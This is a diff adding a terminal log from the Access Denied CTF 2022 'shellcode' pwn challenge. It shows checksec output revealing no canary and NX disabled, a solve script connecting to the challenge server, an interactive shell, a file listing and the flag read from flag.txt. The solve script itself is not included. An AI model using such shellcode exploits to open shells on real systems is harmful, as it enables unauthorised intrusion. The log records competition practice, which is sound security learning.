@@ -1,0 +1,24 @@
+mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_shellcode/shellcode$ python solve.py r
+[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_shellcode/shellcode/shellcode'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[+] Opening connection to 34.134.85.196 on port 5337: Done
+[*] Switching to interactive mode
+$ id
+/bin//sh: 1: id: not found
+$ ls -l
+total 48
+drwxr-x--- 1 0 1000  4096 Jun  9 02:09 bin
+drwxr-x--- 1 0 1000  4096 Jun  9 02:09 dev
+-rwxr----- 1 0 1000    64 Jun  9 02:10 flag.txt
+drwxr-x--- 1 0 1000  4096 Jun  9 02:08 lib
+drwxr-x--- 1 0 1000  4096 Jun  9 02:08 lib32
+drwxr-x--- 1 0 1000  4096 Jun  9 02:08 lib64
+drwxr-x--- 1 0 1000  4096 Jun  9 02:08 libx32
+-rwxr-x--- 1 0 1000 19392 Jun  8 05:49 shellcode
+$ cat flag.txt
+accessdenied{3x3cut3d_x64_sh3ll_0v3rfl0w_5ucc3ssfully_611a1501}
